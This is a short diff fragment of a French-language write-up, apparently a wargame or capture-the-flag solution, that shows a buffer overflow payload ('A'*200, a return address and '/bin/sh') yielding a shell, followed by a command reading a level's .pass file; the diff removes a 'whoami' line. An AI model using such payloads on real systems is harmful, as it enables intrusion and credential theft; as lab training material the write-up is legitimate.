@@ -68,8 +68,6 @@ La valeur de msg sera donc : 'A'*200 + '\x8c\x48\x55\x55\x55\x55' + '/bin/sh'
 --> Nous avons donc acces a un terminal:
 
 ```shell
-whoami
-#end
 cat /home/users/end/.pass
 ```
 
